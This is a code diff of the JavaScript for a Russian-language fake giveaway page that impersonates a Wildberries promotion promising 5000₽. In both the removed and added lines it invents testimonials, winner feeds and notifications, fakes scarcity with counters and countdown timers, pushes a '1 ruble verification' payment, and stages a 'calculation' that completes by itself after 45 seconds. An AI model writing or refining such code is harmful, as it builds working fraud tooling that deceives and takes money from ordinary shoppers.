-        function generateChatMessage(type) {
-            const users = [
-                {name: "Анна_К", city: "Москва"},
-                {name: "Марина_Стиль", city: "Казань"},
-                {name: "Ольга_Виноград", city: "Сочи"},
-                {name: "Светлана_Премиум", city: "Екатеринбург"},
-                {name: "Ирина_Шопер", city: "Новосибирск"},
-                {name: "Александр", city: "Краснодар"},
-                {name: "Дарья_Л", city: "Воронеж"},
-                {name: "Елена_Про", city: "СПб"}
-            ];
-            const user = users[Math.floor(Math.random() * users.length)];
-            const time = new Date();
-            const timeStr = `${time.getHours().toString().padStart(2,'0')}:${time.getMinutes().toString().padStart(2,'0')}`;
-            
-            const messages = {
-                user: [
-                    "Только что получила 5000₽! Всё реально, ребят!",
-                    "Спасибо за розыгрыш! Уже потратила на платье ✨",
-                    "Как быстро пришли деньги?",
-                    "Я тоже сначала сомневалась, но это работает!",
-                    "Кто уже получил, подскажите, как активировать?",
-                    "Ура! Только что активировала купон!",
-                    "За 1 рубль отдавать не страшно?",
-                    "Девушки, это не развод! Я проверила!"
-                ],
-                system: [
-                    "✅ Система: Для получения 5000₽ необходимо пройти верификацию (1 рубль).",
-                    "⚠️ Система: Осталось менее 10 подарков. Успейте получить!",
-                    "🎉 Система: Только что 3 участника получили по 5000₽!",
-                    "ℹ️ Система: Все выплаты гарантированы официальным партнёром Wildberries.",
-                    "⏰ Система: До конца розыгрыша осталось 15 минут!"
-                ]
-            };
-            
-            const text = messages[type][Math.floor(Math.random() * messages[type].length)];
-            
-            return {
-                type,
-                user,
-                text,
-                time: timeStr
-            };
-        }
-
-        // Генерация записи в "прямом эфире"
-        function generateLiveItem() {
-            const names = ["Анна К.", "Марина С.", "Ольга В.", "Ирина М.", "Светлана П.", "Елена Т.", "Дарья Ч.", "Алексей М.", "Наталья Б."];
-            const cities = ["Москва", "Казань", "Сочи", "Екатеринбург", "Новосибирск", "Краснодар", "Санкт-Петербург"];
-            const amounts = ["1000₽", "1500₽", "2000₽", "2500₽", "3000₽", "3500₽", "4000₽", "4500₽", "5000₽", "5000₽", "5000₽"];
-            
-            return {
-                name: names[Math.floor(Math.random() * names.length)],
-                city: cities[Math.floor(Math.random() * cities.length)],
-                amount: amounts[Math.floor(Math.random() * amounts.length)]
-            };
-        }
-
-        // =========== ОТОБРАЖЕНИЕ КОНТЕНТА ===========
-        // Обновление чата
-        function updateChat() {
-            const chatContainer = document.getElementById('chatMessages');
-            
-            // Добавляем новое сообщение (каждые 5-10 секунд)
-            if (Math.random() > 0.7) {
-                const type = Math.random() > 0.5 ? 'user' : 'system';
-                const msg = generateChatMessage(type);
-                chatMessages.unshift(msg); // Добавляем в начало
-                
-                if (chatMessages.length > 8) chatMessages.pop();
-                
-                // Очищаем и перерисовываем
-                chatContainer.innerHTML = '';
-                chatMessages.forEach(msg => {
-                    const msgEl = document.createElement('div');
-                    msgEl.className = `chat-message chat-${msg.type}`;
-                    msgEl.innerHTML = `
-                        <div><strong>${msg.user?.name || 'Система'}:</strong> ${msg.text}</div>
-                        <div class="chat-time">${msg.time}</div>
-                    `;
-                    chatContainer.appendChild(msgEl);
-                });
-            }
-        }
-
-        // Обновление "прямого эфира"
-        function updateLiveFeed() {
-            const feedContainer = document.getElementById('liveFeed');
-            
-            // Добавляем новую запись (каждые 6-15 секунд)
-            if (Math.random() > 0.8) {
-                const item = generateLiveItem();
-                liveFeed.unshift(item);
-                
-                if (liveFeed.length > 5) liveFeed.pop();
-                
-                feedContainer.innerHTML = '';
-                liveFeed.forEach(item => {
-                    const itemEl = document.createElement('div');
-                    itemEl.className = 'live-item';
-                    itemEl.innerHTML = `
-                        <div class="live-avatar">${item.name.split(' ')[0].charAt(0)}</div>
-                        <div class="live-text">
-                            <strong>${item.name}</strong> (${item.city}) получил(а) гарантированный приз
-                        </div>
-                        <div class="live-amount">${item.amount}</div>
-                    `;
-                    feedContainer.appendChild(itemEl);
-                });
-            }
-        }
-
-        // =========== АГРЕССИВНЫЕ УВЕДОМЛЕНИЯ ===========
-        function showAggressivePopup() {
-            const popup = document.getElementById('popupAlert');
-            const texts = [
-                "⏱️ Подарков осталось всего 7! Успейте получить 5000₽!",
-                "🚨 Внимание! Через 5 минут розыгрыш закончится!",
-                "💰 Только что 3 человека получили по 5000₽! Вы следующий?",
-                "⚡ СРОЧНО! Ваша заявка на 5000₽ ожидает подтверждения!",
-                "🎯 Не упустите! Осталось 6 подарков из 50!"
-            ];
-            
-            document.getElementById('popupText').textContent = texts[Math.floor(Math.random() * texts.length)];
-            popup.style.display = 'flex';
-            
-            // Автоскрытие через 7 секунд
-            setTimeout(() => {
-                popup.style.display = 'none';
-            }, 7000);
-        }
-
-        // =========== ОБНОВЛЕНИЕ СЧЁТЧИКА ДЕФИЦИТА ===========
-        function updateCounter() {
-            if (giftsLeft > 1 && Math.random() > 0.85) {
-                giftsLeft--;
-                document.getElementById('leftGifts').textContent = giftsLeft;
-                const percent = (giftsLeft / totalGifts) * 100;
-                document.getElementById('counterFill').style.width = percent + '%';
-                
-                // Показываем агрессивное уведомление при уменьшении счётчика
-                if (giftsLeft < 10) showAggressivePopup();
-            }
-        }
-
-        // =========== ТАЙМЕРЫ ===========
-        // Таймер общего времени
-        let totalTime = 11 * 60 + 24; // 11:24 в секундах
-        function updateMainTimer() {
-            if (totalTime <= 0) return;
-            
-            totalTime--;
-            const minutes = Math.floor(totalTime / 60);
-            const seconds = totalTime % 60;
-            document.getElementById('leftTime').textContent = 
-                `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
-        }
-
-        // Таймер на финальном экране
-        let finalTime = 23 * 60 + 59;
-        function updateFinalTimer() {
-            if (finalTime <= 0) return;
-            
-            finalTime--;
-            const minutes = Math.floor(finalTime / 60);
-            const seconds = finalTime % 60;
-            document.getElementById('finalTimer').textContent = 
-                `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
-        }
-
-        // =========== ОСНОВНАЯ ЛОГИКА ===========
-        function nextStep(step) {
-            event.preventDefault();
-            
-            // Если нажали на кнопку "Получить 5000₽"
-            if (step === 2) {
-                // Показываем финальный экран
-                document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
-                document.getElementById('finalScreen').classList.add('active');
-                document.querySelector('.form-container').style.display = 'none';
-                
-                // Запускаем финальный таймер
-                setInterval(updateFinalTimer, 1000);
-                
-                // Показываем супер-агрессивное уведомление
-                setTimeout(() => {
-                    showAggressivePopup();
-                }, 2000);
-                
-                return;
-            }
-            
-            // Обычный переход между шагами
-            document.getElementById(`step${currentStep}`).classList.remove('active');
-            currentStep++;
-            document.getElementById(`step${currentStep}`).classList.add('active');
-            
-            // Уменьшаем счётчик подарков при переходе
-            updateCounter();
-        }
-
         // =========== ИНИЦИАЛИЗАЦИЯ ===========
+        let currentAmount = 3000;
+        let isVerificationComplete = false;
+        const finalAmount = 5000;
+
+        // Анимация увеличения суммы
+        function updateAmount(newAmount) {
+            const amountElement = document.getElementById('amountValue');
+            const step = 100;
+            const duration = 800;
+            const steps = Math.abs(newAmount - currentAmount) / step;
+            const interval = duration / steps;
+            
+            let current = currentAmount;
+            const increment = newAmount > currentAmount ? step : -step;
+            
+            const timer = setInterval(() => {
+                current += increment;
+                
+                if ((increment > 0 && current >= newAmount) || 
+                    (increment < 0 && current <= newAmount)) {
+                    current = newAmount;
+                    clearInterval(timer);
+                }
+                
+                amountElement.textContent = current.toLocaleString('ru-RU') + '₽';
+            }, interval);
+            
+            currentAmount = newAmount;
+        }
+
+        function updateAmountFromSelect() {
+            const select = document.getElementById('frequencySelect');
+            const value = parseInt(select.value);
+            updateAmount(value);
+        }
+
+        // Показ уведомлений
+        function showNotification() {
+            const notifications = [
+                {name: "Анна П.", amount: "4500₽", time: "5 минут назад"},
+                {name: "Сергей М.", amount: "5000₽", time: "8 минут назад"},
+                {name: "Ольга В.", amount: "3800₽", time: "12 минут назад"},
+                {name: "Дмитрий К.", amount: "5000₽", time: "15 минут назад"},
+                {name: "Елена С.", amount: "4200₽", time: "20 минут назад"}
+            ];
+            
+            const notif = notifications[Math.floor(Math.random() * notifications.length)];
+            const notification = document.getElementById('notification');
+            const avatar = notification.querySelector('.notification-avatar');
+            const text = notification.querySelector('.notification-text');
+            const time = notification.querySelector('.notification-time');
+            
+            avatar.textContent = notif.name.split(' ')[0].charAt(0) + notif.name.split(' ')[1].charAt(0);
+            text.innerHTML = `<strong>${notif.name}</strong> только что получила ${notif.amount} после проверки статуса.`;
+            time.textContent = notif.time;
+            
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+
+        // Завершение проверки
+        function completeVerification() {
+            if (isVerificationComplete) return;
+            
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> РАССЧИТЫВАЕМ...';
+            submitBtn.disabled = true;
+            
+            // Меняем статус шагов
+            setTimeout(() => {
+                document.querySelectorAll('.step')[1].classList.remove('active');
+                document.querySelectorAll('.step')[1].classList.add('completed');
+                document.querySelectorAll('.step')[2].classList.add('active');
+                
+                submitBtn.innerHTML = '<i class="fas fa-check"></i> РАСЧЁТ ЗАВЕРШЁН';
+            }, 1500);
+            
+            // Показываем финальный экран
+            setTimeout(() => {
+                document.getElementById('formSection').style.display = 'none';
+                document.getElementById('finalScreen').classList.add('active');
+                
+                // Обновляем сумму до 5000
+                updateAmount(finalAmount);
+                
+                // Показываем первое уведомление
+                setTimeout(showNotification, 1000);
+            }, 3000);
+            
+            isVerificationComplete = true;
+            
+            // Показываем случайные уведомления
+            setInterval(() => {
+                if (Math.random() > 0.6) {
+                    showNotification();
+                }
+            }, 15000);
+        }
+
+        // Инициализация
         window.onload = function() {
-            // Заполняем начальный контент
-            for (let i = 0; i < 4; i++) {
-                updateChat();
-                updateLiveFeed();
-            }
+            // Запускаем анимацию начальной суммы
+            setTimeout(() => {
+                updateAmount(3000);
+            }, 500);
             
-            // Запускаем таймеры
-            setInterval(updateMainTimer, 1000);
-            setInterval(updateChat, 8000 + Math.random() * 7000);
-            setInterval(updateLiveFeed, 6000 + Math.random() * 9000);
-            setInterval(updateCounter, 12000);
+            // Показываем первое уведомление через 8 секунд
+            setTimeout(showNotification, 8000);
             
-            // Показываем первое агрессивное уведомление через 10 секунд
-            setTimeout(showAggressivePopup, 10000);
+            // Периодические уведомления
+            setInterval(() => {
+                if (!isVerificationComplete && Math.random() > 0.7) {
+                    showNotification();
+                }
+            }, 20000);
             
-            // Показываем случайные уведомления каждые 25-40 секунд
-            setInterval(showAggressivePopup, 25000 + Math.random() * 15000);
+            // Автоматический расчёт через 45 секунд (если пользователь не нажал)
+            setTimeout(() => {
+                if (!isVerificationComplete) {
+                    document.getElementById('submitBtn').innerHTML = '<i class="fas fa-exclamation-triangle"></i> РАССЧИТАТЬ АВТОМАТИЧЕСКИ';
+                    document.getElementById('submitBtn').style.background = 'var(--wb-warning)';
+                    
+                    setTimeout(() => {
+                        if (!isVerificationComplete) {
+                            completeVerification();
+                        }
+                    }, 5000);
+                }
+            }, 45000);
         };
     </script>
 </body>
